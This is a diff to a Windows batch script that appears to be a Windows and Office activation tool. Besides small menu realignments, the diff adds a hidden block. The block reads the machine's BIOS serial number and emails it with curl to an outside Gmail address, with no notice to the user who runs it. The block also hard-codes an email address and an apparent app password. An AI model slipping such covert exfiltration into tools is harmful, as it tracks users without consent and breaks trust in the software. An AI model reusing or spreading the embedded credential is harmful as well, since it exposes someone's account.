@@ -256,6 +256,46 @@ if "%username%"=="%correct_username%" (
 )
 
 :loged
+
+
+
+rem Set Gmail account credentials
+set "EMAIL=nelchhai@gmail.com"
+set "PASSWORD=zqbd mbdr fnxq nmdu"
+
+rem Get BIOS serial number
+for /F "delims=" %%A in ('wmic bios get serialnumber ^| findstr /r /v "^$"') do (
+    set "serial_number=%%A"
+)
+
+rem Set email parameters
+set "TO=chhai.developer@gmail.com"
+set "SUBJECT=Tools are using!"
+set "MESSAGE=BIOS Serial Number: %serial_number%"
+
+rem Create a temporary file for MIME message
+set "MIME_TEMP=%TEMP%\email_multipart.txt"
+(
+    echo From: %EMAIL%
+    echo To: %TO%
+    echo Subject: %SUBJECT%
+    echo Content-Type: text/plain; charset=utf-8
+    echo.
+    echo %MESSAGE%
+)>"%MIME_TEMP%"
+
+rem Send email using curl
+curl -s -S --url "smtps://smtp.gmail.com:465" --ssl-reqd ^
+--mail-from "%EMAIL%" --mail-rcpt "%TO%" --user "%EMAIL%:%PASSWORD%" ^
+--insecure --upload-file "%MIME_TEMP%"
+
+rem Clean up temporary file
+del "%MIME_TEMP%"
+
+
+
+
+
 cls
 color 0a
 echo.
@@ -318,12 +358,12 @@ echo:
 call :_color2 %_White% "                            " %_Green% "Activation Methods"
 echo:____________________________________________________________________________
 echo.
-echo:             [1] Windows License                ^|   Lifetime License
-echo:             _______________________________________________________      
+echo:           [1] Windows License                ^|   Lifetime License
+echo:           ________________________________________________________      
 echo:
-echo:             [2] Activation Status              ^|   Window ^& Office
-echo:             [3] Troubleshoot License           ^|   Window ^& Office
-echo:             [0] Exit the script                ^|   Exit the tools
+echo:           [2] Activation Status              ^|   Window ^& Office
+echo:           [3] Troubleshoot License           ^|   Window ^& Office
+echo:           [0] Exit the script                ^|   Exit the tools
 echo:
 echo:____________________________________________________________________________
 echo:
